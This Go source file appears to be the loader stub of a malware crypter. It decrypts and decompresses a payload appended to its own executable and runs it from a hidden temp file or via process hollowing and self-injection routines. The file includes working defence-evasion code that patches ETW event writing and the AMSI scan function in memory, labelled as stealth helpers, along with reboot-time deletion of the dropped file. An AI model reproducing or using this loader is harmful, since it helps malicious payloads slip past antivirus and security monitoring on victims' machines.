//go:build ignore

package main

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/ulikunitz/xz"
	"golang.org/x/crypto/chacha20poly1305"
)

// peEmbeddedArgs holds the combined arguments forwarded to the unpacked payload.
var peEmbeddedArgs []string

// Windows API – lazy-loaded DLL procs.
// All strategy-specific procs are declared here so they are available to
// the strategy source file compiled alongside this base.
var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	ntdll    = syscall.NewLazyDLL("ntdll.dll")
	amsi     = syscall.NewLazyDLL("amsi.dll")

	// executeFromTemp helpers
	procSetFileAttrs = kernel32.NewProc("SetFileAttributesW")
	procMoveFileEx   = kernel32.NewProc("MoveFileExW")

	// process_hollowing strategy
	procCreateProcess   = kernel32.NewProc("CreateProcessW")
	procVirtualAllocEx  = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMem = kernel32.NewProc("WriteProcessMemory")
	procReadProcessMem  = kernel32.NewProc("ReadProcessMemory")
	procGetThreadCtx    = kernel32.NewProc("GetThreadContext")
	procSetThreadCtx    = kernel32.NewProc("SetThreadContext")
	procResumeThread    = kernel32.NewProc("ResumeThread")
	procNtUnmapView     = ntdll.NewProc("NtUnmapViewOfSection")

	// self_injection strategy
	procVirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	procVirtualProtect      = kernel32.NewProc("VirtualProtect")
	procCreateThread        = kernel32.NewProc("CreateThread")
	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	procCloseHandle         = kernel32.NewProc("CloseHandle")
	procLoadLibraryA        = kernel32.NewProc("LoadLibraryA")
	procGetProcAddress      = kernel32.NewProc("GetProcAddress")

	procNtAllocateVirtualMemory = ntdll.NewProc("NtAllocateVirtualMemory")
	procNtCreateThreadEx        = ntdll.NewProc("NtCreateThreadEx")
	procNtWaitForSingleObject   = ntdll.NewProc("NtWaitForSingleObject")
	procNtClose                 = ntdll.NewProc("NtClose")

	// stealth helpers used by self_injection
	procEtwEventWrite  = ntdll.NewProc("EtwEventWrite")
	procAmsiScanBuffer = amsi.NewProc("AmsiScanBuffer")
)

var (
	etwPatched  bool
	amsiPatched bool
)

func main() {
	exePath, err := os.Executable()
	if err != nil {
		os.Exit(1)
	}
	f, err := os.Open(exePath)
	if err != nil {
		os.Exit(1)
	}
	defer f.Close()

	stat, _ := f.Stat()
	fileSize := stat.Size()

	// Read metadata size (last 8 bytes).
	f.Seek(fileSize-8, 0)
	var metadataSize uint64
	binary.Read(f, binary.LittleEndian, &metadataSize)

	// Read metadata.
	metadataOffset := fileSize - 8 - int64(metadataSize)
	f.Seek(metadataOffset, 0)
	metadataBytes := make([]byte, metadataSize)
	f.Read(metadataBytes)
	m := parseMetadata(metadataBytes)

	// Read encrypted payload.
	payloadOffset := metadataOffset - int64(m.EncryptedSize)
	f.Seek(payloadOffset, 0)
	encryptedPayload := make([]byte, m.EncryptedSize)
	f.Read(encryptedPayload)
	f.Close()

	decrypted, err := decrypt(encryptedPayload, m.Key, m.Nonce, m.EncryptionAlgo)
	if err != nil {
		os.Exit(1)
	}

	decompressed, err := decompress(decrypted, m.CompressionAlgo)
	if err != nil {
		os.Exit(1)
	}

	payload := trimToOriginal(decompressed, m.OriginalSize)

	configuredArgs := parseUserParams(m.UserParams)
	peEmbeddedArgs = combineArgs(configuredArgs, os.Args[1:])

	mode := strings.ToLower(strings.TrimSpace(m.InMemoryMode))
	switch mode {
	case "process_hollowing", "self_injection", "auto":
		executeStrategy(payload)
	case "", "off", "base_exec":
		executeFromTemp(payload)
	default:
		if m.UseInMemory {
			executeStrategy(payload)
		} else {
			executeFromTemp(payload)
		}
	}
}

// ---------- Metadata ----------

type Metadata struct {
	OriginalSize    uint64
	CompressedSize  uint64
	EncryptedSize   uint64
	CompressionAlgo string
	EncryptionAlgo  string
	Key             []byte
	Nonce           []byte
	UseInMemory     bool
	InMemoryMode    string
	UserParams      string
}

func parseMetadata(data []byte) *Metadata {
	r := bytes.NewReader(data)
	m := &Metadata{}

	binary.Read(r, binary.LittleEndian, &m.OriginalSize)
	binary.Read(r, binary.LittleEndian, &m.CompressedSize)
	binary.Read(r, binary.LittleEndian, &m.EncryptedSize)

	compAlgo := make([]byte, 16)
	r.Read(compAlgo)
	m.CompressionAlgo = string(bytes.TrimRight(compAlgo, "\x00"))

	encAlgo := make([]byte, 16)
	r.Read(encAlgo)
	m.EncryptionAlgo = string(bytes.TrimRight(encAlgo, "\x00"))

	var keySize, nonceSize uint32
	binary.Read(r, binary.LittleEndian, &keySize)
	if keySize > 0 {
		m.Key = make([]byte, keySize)
		r.Read(m.Key)
	}
	binary.Read(r, binary.LittleEndian, &nonceSize)
	if nonceSize > 0 {
		m.Nonce = make([]byte, nonceSize)
		r.Read(m.Nonce)
	}
	b, _ := r.ReadByte()
	m.UseInMemory = b == 1
	modeRaw := make([]byte, 16)
	r.Read(modeRaw)
	m.InMemoryMode = string(bytes.TrimRight(modeRaw, "\x00"))
	var paramLen uint32
	binary.Read(r, binary.LittleEndian, &paramLen)
	if paramLen > 0 {
		paramBuf := make([]byte, paramLen)
		r.Read(paramBuf)
		m.UserParams = string(paramBuf)
	}
	return m
}

// ---------- Crypto ----------

func decrypt(data, key, nonce []byte, algo string) ([]byte, error) {
	switch algo {
	case "xor":
		return decryptXOR(data, key), nil
	case "aes-256-gcm":
		return decryptAES(data, key, nonce)
	case "chacha20":
		return decryptChaCha(data, key, nonce)
	case "none":
		return data, nil
	default:
		return nil, nil
	}
}

func decryptXOR(data, key []byte) []byte {
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

func decryptAES(data, key, nonce []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, nonce, data, nil)
}

func decryptChaCha(data, key, nonce []byte) ([]byte, error) {
	aead, err := chacha20poly1305.New(key)
	if err != nil {
		return nil, err
	}
	return aead.Open(nil, nonce, data, nil)
}

// ---------- Decompression ----------

func decompress(data []byte, algo string) ([]byte, error) {
	switch algo {
	case "xz", "lzma":
		r, err := xz.NewReader(bytes.NewReader(data))
		if err != nil {
			return nil, err
		}
		return io.ReadAll(r)
	case "zlib":
		r, err := zlib.NewReader(bytes.NewReader(data))
		if err != nil {
			return nil, err
		}
		defer r.Close()
		return io.ReadAll(r)
	case "none":
		return data, nil
	default:
		return nil, nil
	}
}

// trimToOriginal slices the decompressed buffer back to the original payload size.
// When random padding is enabled, padding is split 50/50 before and after the payload.
func trimToOriginal(data []byte, originalSize uint64) []byte {
	if originalSize == 0 {
		return data
	}
	total := uint64(len(data))
	if total == originalSize {
		return data
	}
	if total > originalSize {
		extra := total - originalSize
		start := int(extra / 2)
		end := start + int(originalSize)
		if start >= 0 && end <= len(data) {
			return data[start:end]
		}
	}
	return data
}

// ---------- Execution ----------

// executeFromTemp writes the payload to a temporary executable file and runs it.
// This is the default (base_exec) strategy and the fallback for in-memory strategies.
func executeFromTemp(payload []byte) {
	exePath, _ := os.Executable()
	dir := ""
	if exePath != "" {
		dir = filepath.Dir(exePath)
	}

	var tmp *os.File
	var err error
	if dir != "" {
		tmp, err = os.CreateTemp(dir, ".~tmp-*.exe")
	}
	if err != nil || tmp == nil {
		tmp, err = os.CreateTemp("", ".tmp-*.exe")
		if err != nil {
			os.Exit(1)
		}
	}
	tmpPath := tmp.Name()
	tmp.Write(payload)
	tmp.Close()

	if p := syscall.StringToUTF16Ptr(tmpPath); p != nil {
		const fileAttributeHidden = 0x2
		const fileAttributeTemporary = 0x100
		procSetFileAttrs.Call(
			uintptr(unsafe.Pointer(p)),
			uintptr(fileAttributeHidden|fileAttributeTemporary),
		)
	}

	cmd := exec.Command(tmpPath, peEmbeddedArgs...)
	if dir != "" {
		cmd.Dir = dir
	}
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	cmd.Run()

	cleanupTempFile(tmpPath)
}

// cleanupTempFile removes the temporary file, retrying for up to ~10 s to
// handle the file being briefly locked after process exit. If the file cannot
// be deleted before the retry budget is exhausted it is scheduled for removal
// at the next Windows reboot.
func cleanupTempFile(path string) {
	for i := 0; i < 50; i++ {
		if os.Remove(path) == nil {
			return
		}
		time.Sleep(200 * time.Millisecond)
	}
	const movefileDelayUntilReboot = 0x4
	pOld := syscall.StringToUTF16Ptr(path)
	procMoveFileEx.Call(uintptr(unsafe.Pointer(pOld)), 0, movefileDelayUntilReboot)
}

// ---------- Stealth helpers (used by self_injection strategy) ----------

// disableStealthGuards patches ETW and AMSI in the current process.
// Called by the self_injection strategy before running the payload image.
func disableStealthGuards() {
	disableETW()
	disableAMSI()
}

func disableETW() {
	if etwPatched || runtime.GOARCH != "amd64" {
		return
	}
	addr := procEtwEventWrite.Addr()
	if addr == 0 {
		return
	}
	if patchMemory(addr, []byte{0xC3}) {
		etwPatched = true
	}
}

func disableAMSI() {
	if amsiPatched || runtime.GOARCH != "amd64" {
		return
	}
	if amsi.Load() != nil {
		return
	}
	addr := procAmsiScanBuffer.Addr()
	if addr == 0 {
		return
	}
	if patchMemory(addr, []byte{0x31, 0xC0, 0xC3}) {
		amsiPatched = true
	}
}

func patchMemory(addr uintptr, patch []byte) bool {
	if addr == 0 || len(patch) == 0 {
		return false
	}
	var oldProtect uint32
	ret, _, _ := procVirtualProtect.Call(
		addr,
		uintptr(len(patch)),
		0x40,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return false
	}
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}
	procVirtualProtect.Call(addr, uintptr(len(patch)), uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)))
	return true
}

// ---------- Argument helpers ----------

func parseUserParams(raw string) []string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return nil
	}
	var args []string
	var current strings.Builder
	inQuotes := false
	for _, r := range raw {
		switch r {
		case '"':
			inQuotes = !inQuotes
		case ' ', '\t':
			if inQuotes {
				current.WriteRune(r)
			} else if current.Len() > 0 {
				args = append(args, current.String())
				current.Reset()
			}
		default:
			current.WriteRune(r)
		}
	}
	if current.Len() > 0 {
		args = append(args, current.String())
	}
	return args
}

func combineArgs(configured, runtimeArgs []string) []string {
	if len(configured) == 0 && len(runtimeArgs) == 0 {
		return nil
	}
	out := make([]string, 0, len(configured)+len(runtimeArgs))
	out = append(out, configured...)
	out = append(out, runtimeArgs...)
	return out
}

func quoteArg(arg string) string {
	if arg == "" {
		return `""`
	}
	needsQuote := false
	for _, r := range arg {
		if r == ' ' || r == '\t' || r == '"' {
			needsQuote = true
			break
		}
	}
	if !needsQuote {
		return arg
	}
	return `"` + strings.ReplaceAll(arg, `"`, `\"`) + `"`
}

// buildCmdline builds a single command-line string from a slice of arguments.
// Used by in-memory strategies when spawning processes.
func buildCmdline(args []string) string {
	parts := make([]string, 0, len(args))
	for _, a := range args {
		parts = append(parts, quoteArg(a))
	}
	return strings.Join(parts, " ")
}

// buildCommandLine returns the UTF-16 encoded command line for CreateProcessW.
func buildCommandLine(exePath string, args []string) []uint16 {
	if len(args) == 0 {
		return nil
	}
	parts := make([]string, 0, len(args)+1)
	parts = append(parts, quoteArg(exePath))
	parts = append(parts, args...)
	line := strings.Join(parts, " ")
	u16, _ := syscall.UTF16FromString(line)
	return u16
}
